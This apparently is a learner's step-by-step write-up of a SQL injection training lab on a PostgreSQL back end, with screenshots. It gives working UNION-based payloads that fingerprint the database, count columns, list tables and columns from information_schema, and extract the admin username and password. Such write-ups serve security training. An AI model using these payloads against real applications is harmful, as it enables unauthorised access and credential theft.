Lab: SQL injection attack, listing the database contents on non-Oracle databases.
Goal- Get admin password from users table.
Step 1 - Know type of database
     ' UNION SELECT version() -- => postgres
     But ofcoures i tried others and they didnt work,only postgre worked.
     <img width="1606" height="910" alt="image" src="https://github.com/user-attachments/assets/77500ca4-2c80-4771-8780-e5b63cf0471c" />

     
step 2 - Get the number of columns
    ' ORDER BY 1,2,3 -- => RESULTS is 2
Step3 - Now get the tables.
  ' UNION SELECT table_name,NULL FROM information_schema.tables --
  <img width="1231" height="739" alt="image" src="https://github.com/user-attachments/assets/a7625968-dcc2-49cf-a935-0a8726f253c9" />
  <img width="624" height="730" alt="image" src="https://github.com/user-attachments/assets/82c98044-b05a-4efc-9ea4-8cdcce729a88" />
  RESULT = users_sercrc
Step 4 - get the columns
  ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_sercrc'--
  <img width="1601" height="907" alt="image" src="https://github.com/user-attachments/assets/bb3363c6-c9ed-4285-a400-acbdad048998" />
 RESULT= username_qvjlxf
       = password_egblfj
step 5 - get the usernames and password .specificallly for admin.
   ' UNION SELECT username_qvjlxf,password_egblfj FROM users_sercrc--
   <img width="1602" height="916" alt="image" src="https://github.com/user-attachments/assets/eed56bdd-f7d1-4ae6-b1eb-420850f49dad" />
and yes i got the credentials.

<img width="1919" height="927" alt="image" src="https://github.com/user-attachments/assets/3e83db72-efab-44ea-8d61-8a7be17a404f" />
#HAPPINESS
